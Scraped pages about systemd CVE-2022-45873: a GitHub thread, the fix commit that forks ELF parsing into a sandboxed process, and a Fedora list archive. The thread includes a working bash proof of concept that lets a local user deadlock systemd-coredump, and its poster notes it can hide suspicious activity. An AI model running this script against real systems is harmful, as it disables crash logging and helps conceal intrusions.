### **[AdamWill](/AdamWill)** commented [Oct 19, 2022](#issuecomment-1284087650)

| so I tried a systemd with this patch on a gnome-calendar crash, and still didn't get a coredump, probably because: Oct 18 18:29:21 fedora systemd[1]: systemd-coredump@0-2842-0.service: Failed with result 'timeout'.  On my machine, generating the crash takes 5 seconds. So if it timed out, either something is wrong with the patch, or it wasn't applied properly, or there's some other bug. I'll test my patch again here.  Edit: yeah, it seems to work fine here.  ``` $ journalctl -b _PID=2667772 -o cat | head  Process 2667524 (3) of user 1000 dumped core.  Module linux-vdso.so.1 with build-id b21929a49b68b52a4059932eb797eb7182e48f08 Module libopensc.so.8 with build-id 7e70dbbc60cc7358472bcd2a198f1d548af8ab62 Metadata for module libopensc.so.8 owned by FDO found: { 	"type" : "rpm", 	"name" : "opensc", 	"version" : "0.22.0-7.fc37", 	"architecture" : "x86_64", 	"osCpe" : "cpe:/o:fedoraproject:fedora:37" $ journalctl -b _PID=2667772 -o cat | wc  -c 69644  ```  Hmm, that's odd. Note I did a build of the systemd from F37, so 251, with the patch backported. But yeah, then all I did was make gnome-calendar crash and wait. I did do it in a VM with 2G of RAM, so maybe that was a problem... |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 14, 2022](#issuecomment-1313733553)

| Just to make it easier to fill out some form I'll leave a script bringing down `systemd-coredump` on Fedora 36 with `systemd-250.8` (as any local user) here. Combined with [#24139](https://github.com/systemd/systemd/issues/24139) it can be used to totally hide any weird activity where segfaults, coredumps and stuff like that are involved. The idea is to crash a binary calling the same function recursively and put it in a deeply nested directory to make its backtrace large enough to trigger the deadlock. It's run 16 times because of   [systemd/units/systemd-coredump.socket](https://github.com/systemd/systemd/blob/09cd639a59fec13d80ac8fce2d671d088d8cca9f/units/systemd-coredump.socket#L21)  Line 21 in [09cd639](/systemd/systemd/commit/09cd639a59fec13d80ac8fce2d671d088d8cca9f)   |  | MaxConnections=16 | | --- | --- |      ``` #!/bin/bash set -ex  ulimit -c unlimited  d=$(mktemp -d) pushd "$d"  cat <<'EOL' >hey.c void f() { f(); } int main(int argc, char *argv[]) {     f();     return 0; } EOL  gcc hey.c  a=$(perl -e 'print "A" x 255') for i in {1..10}; do     mkdir "$a"     mv a.out "$a"     cd "$a" done  for i in {1..16}; do     ./a.out & done ``` |
| --- | --- | --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 23, 2022](#issuecomment-1325774829)

| [61aea45](https://github.com/systemd/systemd/commit/61aea456c12c54f49c4a76259af130e576130ce9) got [CVE-2022-45873](https://github.com/advisories/GHSA-3w8w-mhj7-j5rc "CVE-2022-45873") |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fpull%2F25055)

Reviewers

[![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=40&v=4)](/yuwata) [yuwata](/yuwata)

yuwata approved these changes

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=40&v=4)](/bluca) [bluca](/bluca)

bluca approved these changes

Assignees

No one assigned

Labels

[coredump](/systemd/systemd/labels/coredump)

Milestone

 [**v252**](/systemd/systemd/milestone/29 "v252")

Development

Successfully merging this pull request may close these issues.

7 participants

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=52&v=4)](/keszybz) [![@AdamWill](https://avatars.githubusercontent.com/u/916551?s=52&v=4)](/AdamWill) [![@poettering](https://avatars.githubusercontent.com/u/2130732?s=52&v=4)](/poettering) [![@mrc0mmand](https://avatars.githubusercontent.com/u/679338?s=52&v=4)](/mrc0mmand) [![@bluca](https://avatars.githubusercontent.com/u/782193?s=52&v=4)](/bluca) [![@evverx](https://avatars.githubusercontent.com/u/10195800?s=52&v=4)](/evverx) [![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=52&v=4)](/yuwata)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_95755932_20250115_114659.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fcommit%2F61aea456c12c54f49c4a76259af130e576130ce9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fcommit%2F61aea456c12c54f49c4a76259af130e576130ce9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=systemd%2Fsystemd)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[systemd](/systemd)
/
**[systemd](/systemd/systemd)**
Public

* [Notifications](/login?return_to=%2Fsystemd%2Fsystemd) You must be signed in to change notification settings
* [Fork
  3.9k](/login?return_to=%2Fsystemd%2Fsystemd)
* [Star
   13.6k](/login?return_to=%2Fsystemd%2Fsystemd)

* [Code](/systemd/systemd)
* [Issues
  2.3k](/systemd/systemd/issues)
* [Pull requests
  346](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

Additional navigation options

* [Code](/systemd/systemd)
* [Issues](/systemd/systemd/issues)
* [Pull requests](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

## Commit

[Permalink](/systemd/systemd/commit/61aea456c12c54f49c4a76259af130e576130ce9)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

coredump: analyze object with libdwelf in forked process

[Browse files](/systemd/systemd/tree/61aea456c12c54f49c4a76259af130e576130ce9)
Browse the repository at this point in the history

```
Parsing objects is risky as data could be malformed or malicious,
so avoid doing that from the main systemd-coredump process and
instead fork another process, and set it to avoid generating
core files itself.
```

* Loading branch information

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=40&v=4)](/bluca)

[bluca](/systemd/systemd/commits?author=bluca "View all commits by bluca")
committed
Nov 30, 2021

1 parent
[67f7675](/systemd/systemd/commit/67f7675f477d369506eeb17ef2d5b365f83ac84a)

commit 61aea45

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**140 additions**
and
**18 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src/coredump

  + src/coredump/coredump.c
    [coredump.c](#diff-25e03646f09722b2e97b77bb7effb48a21a1f0d9171ef69e5770f0e29cf272e9)
  + src/coredump/stacktrace.c
    [stacktrace.c](#diff-ed83293087ac743370da9b0c0d2dfc77f9161a23e5a99ae54a3023210e54f698)
  + src/coredump/stacktrace.h
    [stacktrace.h](#diff-5bf56881d9830cbfc75945ea46901586f2ee1172f05907beb78efa67976fd04b)
* units

  + units/systemd-coredump@.service.in
    [systemd-coredump@.service.in](#diff-b073ebe9b4d173ea80aa1c100d15a88a0d97a255784496a5744f4d4da35d2707)

## There are no files selected for viewing

6 changes: 5 additions & 1 deletion

6
[src/coredump/coredump.c](#diff-25e03646f09722b2e97b77bb7effb48a21a1f0d9171ef69e5770f0e29cf272e9 "src/coredump/coredump.c")

Show comments

[View file](/systemd/systemd/blob/61aea456c12c54f49c4a76259af130e576130ce9/src/coredump/coredump.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -825,7 +825,11 @@ static int submit\_coredump( |
|  |  | "than %"PRIu64" (the configured maximum)", |
|  |  | coredump\_size, arg\_process\_size\_max); |
|  |  | } else if (coredump\_fd >= 0) |
|  |  | coredump\_parse\_core(coredump\_fd, context->meta[META\_EXE], &stacktrace, &json\_metadata); |
|  |  | (void) parse\_elf\_object(coredump\_fd, |
|  |  | context->meta[META\_EXE], |
|  |  | /\* fork\_disable\_dump= \*/endswith(context->meta[META\_EXE], "systemd-coredump"), /\* avoid loops \*/ |
|  |  | &stacktrace, |
|  |  | &json\_metadata); |
|  |  | #endif |
|  |  |  |
|  |  | log: |
| Expand Down | |  |

144 changes: 130 additions & 14 deletions

144
[src/coredump/stacktrace.c](#diff-ed83293087ac743370da9b0c0d2dfc77f9161a23e5a99ae54a3023210e54f698 "src/coredump/stacktrace.c")

Show comments

[View file](/systemd/systemd/blob/61aea456c12c54f49c4a76259af130e576130ce9/src/coredump/stacktrace.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -4,15 +4,21 @@ |
|  |  | #include <elfutils/libdwelf.h> |
|  |  | #include <elfutils/libdwfl.h> |
|  |  | #include <libelf.h> |
|  |  | #include <sys/prctl.h> |
|  |  | #include <sys/resource.h> |
|  |  | #include <sys/types.h> |
|  |  | #include <unistd.h> |
|  |  |  |
|  |  | #include "alloc-util.h" |
|  |  | #include "errno-util.h" |
|  |  | #include "fileio.h" |
|  |  | #include "fd-util.h" |
|  |  | #include "format-util.h" |
|  |  | #include "hexdecoct.h" |
|  |  | #include "io-util.h" |
|  |  | #include "macro.h" |
|  |  | #include "process-util.h" |
|  |  | #include "rlimit-util.h" |
|  |  | #include "stacktrace.h" |
|  |  | #include "string-util.h" |
|  |  | #include "util.h" |
| Expand Down  Expand Up | | @@ -365,30 +371,30 @@ static int parse\_core(int fd, const char \*executable, char \*\*ret, JsonVariant \*\* |
|  |  |  |
|  |  | c.elf = elf\_begin(fd, ELF\_C\_READ\_MMAP, NULL); |
|  |  | if (!c.elf) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, elf\_begin() failed: %s", elf\_errmsg(elf\_errno())); |
|  |  |  |
|  |  | c.dwfl = dwfl\_begin(&callbacks); |
|  |  | if (!c.dwfl) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, dwfl\_begin() failed: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  |  |
|  |  | if (dwfl\_core\_file\_report(c.dwfl, c.elf, executable) < 0) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, dwfl\_core\_file\_report() failed: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  |  |
|  |  | if (dwfl\_report\_end(c.dwfl, NULL, NULL) != 0) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, dwfl\_report\_end() failed: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  |  |
|  |  | if (dwfl\_getmodules(c.dwfl, &module\_callback, &c, 0) < 0) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, dwfl\_getmodules() failed: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  |  |
|  |  | if (dwfl\_core\_file\_attach(c.dwfl, c.elf) < 0) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, dwfl\_core\_file\_attach() failed: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  |  |
|  |  | if (dwfl\_getthreads(c.dwfl, thread\_callback, &c) < 0) |
|  |  | return -EINVAL; |
|  |  | return log\_warning\_errno(SYNTHETIC\_ERRNO(EINVAL), "Could not parse core file, dwfl\_getthreads() failed: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  |  |
|  |  | r = fflush\_and\_check(c.f); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  | return log\_warning\_errno(r, "Could not parse core file, flushing file buffer failed: %m"); |
|  |  |  |
|  |  | c.f = safe\_fclose(c.f); |
|  |  | \*ret = TAKE\_PTR(buf); |
| Expand All | | @@ -398,12 +404,122 @@ static int parse\_core(int fd, const char \*executable, char \*\*ret, JsonVariant \*\* |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | void coredump\_parse\_core(int fd, const char \*executable, char \*\*ret, JsonVariant \*\*ret\_package\_metadata) { |
|  |  | int parse\_elf\_object(int fd, const char \*executable, bool fork\_disable\_dump, char \*\*ret, JsonVariant \*\*ret\_package\_metadata) { |
|  |  | \_cleanup\_close\_pair\_ int error\_pipe[2] = { -1, -1 }, return\_pipe[2] = { -1, -1 }, json\_pipe[2] = { -1, -1 }; |
|  |  | \_cleanup\_(json\_variant\_unrefp) JsonVariant \*package\_metadata = NULL; |
|  |  | \_cleanup\_free\_ char \*buf = NULL; |
|  |  | int r; |
|  |  |  |
|  |  | r = parse\_core(fd, executable, ret, ret\_package\_metadata); |
|  |  | if (r == -EINVAL) |
|  |  | log\_warning("Failed to generate stack trace: %s", dwfl\_errmsg(dwfl\_errno())); |
|  |  | else if (r < 0) |
|  |  | log\_warning\_errno(r, "Failed to generate stack trace: %m"); |
|  |  | r = RET\_NERRNO(pipe2(error\_pipe, O\_CLOEXEC|O\_NONBLOCK)); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  |  |
|  |  | if (ret) { |
|  |  | r = RET\_NERRNO(pipe2(return\_pipe, O\_CLOEXEC)); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  | } |
|  |  |  |
|  |  | if (ret\_package\_metadata) { |
|  |  | r = RET\_NERRNO(pipe2(json\_pipe, O\_CLOEXEC)); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  | } |
|  |  |  |
|  |  | /\* Parsing possibly malformed data is crash-happy, so fork. In case we crash, |
|  |  | \* the core file will not be lost, and the messages will still be attached to |
|  |  | \* the journal. Reading the elf object might be slow, but it still has an upper |
|  |  | \* bound since the core files have an upper size limit. It's also not doing any |
|  |  | \* system call or interacting with the system in any way, besides reading from |
|  |  | \* the file descriptor and writing into these four pipes. \*/ |
|  |  | r = safe\_fork\_full("(sd-parse-elf)", |
|  |  | (int[]){ fd, error\_pipe[1], return\_pipe[1], json\_pipe[1] }, |
|  |  | 4, |
|  |  | FORK\_RESET\_SIGNALS|FORK\_CLOSE\_ALL\_FDS|FORK\_NEW\_MOUNTNS|FORK\_MOUNTNS\_SLAVE|FORK\_NEW\_USERNS|FORK\_WAIT|FORK\_REOPEN\_LOG, |
|  |  | NULL); |
|  |  | if (r < 0) { |
|  |  | if (r == -EPROTO) { /\* We should have the errno from the child, but don't clobber original error \*/ |
|  |  | int e, k; |
|  |  |  |
|  |  | k = read(error\_pipe[0], &e, sizeof(e)); |
|  |  | if (k < 0 && errno != EAGAIN) /\* Pipe is non-blocking, EAGAIN means there's nothing \*/ |
|  |  | return -errno; |
|  |  | if (k == sizeof(e)) |
|  |  | return e; /\* propagate error sent to us from child \*/ |
|  |  | if (k != 0) |
|  |  | return -EIO; |
|  |  | } |
|  |  |  |
|  |  | return r; |
|  |  | } |
|  |  | if (r == 0) { |
|  |  | /\* We want to avoid loops, given this can be called from systemd-coredump \*/ |
|  |  | if (fork\_disable\_dump) |
|  |  | prctl(PR\_SET\_DUMPABLE, 0); |
|  |  |  |
|  |  | r = parse\_core(fd, executable, ret ? &buf : NULL, ret\_package\_metadata ? &package\_metadata : NULL); |
|  |  | if (r < 0) |
|  |  | goto child\_fail; |
|  |  |  |
|  |  | if (buf) { |
|  |  | r = loop\_write(return\_pipe[1], buf, strlen(buf), false); |
|  |  | if (r < 0) |
|  |  | goto child\_fail; |
|  |  |  |
|  |  | return\_pipe[1] = safe\_close(return\_pipe[1]); |
|  |  | } |
|  |  |  |
|  |  | if (package\_metadata) { |
|  |  | \_cleanup\_fclose\_ FILE \*json\_out = NULL; |
|  |  |  |
|  |  | json\_out = take\_fdopen(&json\_pipe[1], "w"); |
|  |  | if (!json\_out) { |
|  |  | r = -errno; |
|  |  | goto child\_fail; |
|  |  | } |
|  |  |  |
|  |  | json\_variant\_dump(package\_metadata, JSON\_FORMAT\_FLUSH, json\_out, NULL); |
|  |  | } |
|  |  |  |
|  |  | \_exit(EXIT\_SUCCESS); |
|  |  |  |
|  |  | child\_fail: |
|  |  | (void) write(error\_pipe[1], &r, sizeof(r)); |
|  |  | \_exit(EXIT\_FAILURE); |
|  |  | } |
|  |  |  |
|  |  | error\_pipe[1] = safe\_close(error\_pipe[1]); |
|  |  | return\_pipe[1] = safe\_close(return\_pipe[1]); |
|  |  | json\_pipe[1] = safe\_close(json\_pipe[1]); |
|  |  |  |
|  |  | if (ret) { |
|  |  | \_cleanup\_fclose\_ FILE \*in = NULL; |
|  |  |  |
|  |  | in = take\_fdopen(&return\_pipe[0], "r"); |
|  |  | if (!in) |
|  |  | return -errno; |
|  |  |  |
|  |  | r = read\_full\_stream(in, &buf, NULL); |
|  |  | if (r < 0) |
|  |  | return r; |
|  |  | } |
|  |  |  |
|  |  | if (ret\_package\_metadata) { |
|  |  | \_cleanup\_fclose\_ FILE \*json\_in = NULL; |
|  |  |  |
|  |  | json\_in = take\_fdopen(&json\_pipe[0], "r"); |
|  |  | if (!json\_in) |
|  |  | return -errno; |
|  |  |  |
|  |  | r = json\_parse\_file(json\_in, NULL, 0, &package\_metadata, NULL, NULL); |
|  |  | if (r < 0 && r != -EINVAL) /\* EINVAL: json was empty, so we got nothing, but that's ok \*/ |
|  |  | return r; |
|  |  | } |
|  |  |  |
|  |  | if (ret) |
|  |  | \*ret = TAKE\_PTR(buf); |
|  |  | if (ret\_package\_metadata) |
|  |  | \*ret\_package\_metadata = TAKE\_PTR(package\_metadata); |
|  |  |  |
|  |  | return 0; |
|  |  | } |

5 changes: 4 additions & 1 deletion

5
[src/coredump/stacktrace.h](#diff-5bf56881d9830cbfc75945ea46901586f2ee1172f05907beb78efa67976fd04b "src/coredump/stacktrace.h")

Show comments

[View file](/systemd/systemd/blob/61aea456c12c54f49c4a76259af130e576130ce9/src/coredump/stacktrace.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,4 +3,7 @@ |
|  |  |  |
|  |  | #include "json.h" |
|  |  |  |
|  |  | void coredump\_parse\_core(int fd, const char \*executable, char \*\*ret, JsonVariant \*\*ret\_package\_metadata); |
|  |  | /\* Parse an ELF object in a forked process, so that errors while iterating over |
|  |  | \* untrusted and potentially malicious data do not propagate to the main caller's process. |
|  |  | \* If fork\_disable\_dump, the child process will not dump core if it crashes. \*/ |
|  |  | int parse\_elf\_object(int fd, const char \*executable, bool fork\_disable\_dump, char \*\*ret, JsonVariant \*\*ret\_package\_metadata); |

3 changes: 1 addition & 2 deletions

3
[units/systemd-coredump@.service.in](#diff-b073ebe9b4d173ea80aa1c100d15a88a0d97a255784496a5744f4d4da35d2707 "units/systemd-coredump@.service.in")

Show comments

[View file](/systemd/systemd/blob/61aea456c12c54f49c4a76259af130e576130ce9/units/systemd-coredump%40.service.in)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -35,11 +35,10 @@ ProtectKernelTunables=yes |
|  |  | ProtectKernelLogs=yes |
|  |  | ProtectSystem=strict |
|  |  | RestrictAddressFamilies=AF\_UNIX |
|  |  | RestrictNamespaces=yes |
|  |  | RestrictRealtime=yes |
|  |  | RestrictSUIDSGID=yes |
|  |  | RuntimeMaxSec=5min |
|  |  | StateDirectory=systemd/coredump |
|  |  | SystemCallArchitectures=native |
|  |  | SystemCallErrorNumber=EPERM |
|  |  | SystemCallFilter=@system-service |
|  |  | SystemCallFilter=@system-service @mount |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `61aea45`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fcommit%2F61aea456c12c54f49c4a76259af130e576130ce9) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from lists.fedoraproject.org_0da796f1_20250114_193415.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/MS5N5SLYAHKENLAJWYBDKU55ICU3SVZF/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

√ó
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
